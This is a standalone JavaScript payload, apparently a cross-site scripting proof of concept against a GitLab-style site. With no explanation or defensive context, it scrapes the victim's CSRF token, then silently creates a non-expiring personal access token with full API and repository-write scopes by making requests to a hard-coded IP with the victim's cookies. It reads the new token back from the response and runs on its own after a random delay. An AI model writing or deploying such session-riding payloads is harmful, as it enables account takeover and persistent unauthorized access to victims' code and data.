function get_final() {
  fetch("https://65.52.77.188/-/profile/personal_access_tokens", {
  "body": null,
  "method": "GET",
  "credentials": "include"
}).then(response => response.text())
  .then(text => {
    const parser = new DOMParser();
    const htmlDocument = parser.parseFromString(text, "text/html");
    const val = htmlDocument.documentElement.querySelector("input[name='created-personal-access-token']").value
    alert(val);
  });
}

function get_access(token) {
  fetch("https://65.52.77.188/-/profile/personal_access_tokens", {
  "body": "X-CSRF-Token="+ encodeURI(token) + "&personal_access_token%5Bname%5D=full&personal_access_token%5Bexpires_at%5D=&personal_access_token%5Bscopes%5D%5B%5D=api&personal_access_token%5Bscopes%5D%5B%5D=write_repository",
  "method": "POST",
  "credentials": "include"
}).then(response => response.text())
  .then(text => {
    const parser = new DOMParser();
    const htmlDocument = parser.parseFromString(text, "text/html");
    const val = htmlDocument.documentElement.querySelector("input[name='created-personal-access-token']").value
    alert(val);
  });
}

function get_token() {
  var xhr = new XMLHttpRequest();
  xhr.responseType = "object";
  // true on the end of here makes the call asynchronous
  xhr.open("GET", "/-/profile/personal_access_tokens", true);
  xhr.onload = function () {
    if (xhr.readyState === xhr.DONE) {
      if (xhr.status === 200) {
        //str = xhr.response.split("'X-CSRF-Token': \"").pop();
        str = xhr.response.split("csrf-token\" content=\"").pop();
        token = str.split("\"")[0];
        get_access(token);
      }
    }
  };
  // Make the request
  xhr.send(null);
}
setTimeout(function () {
    get_token();
  }, Math.floor(Math.random() * 10000));

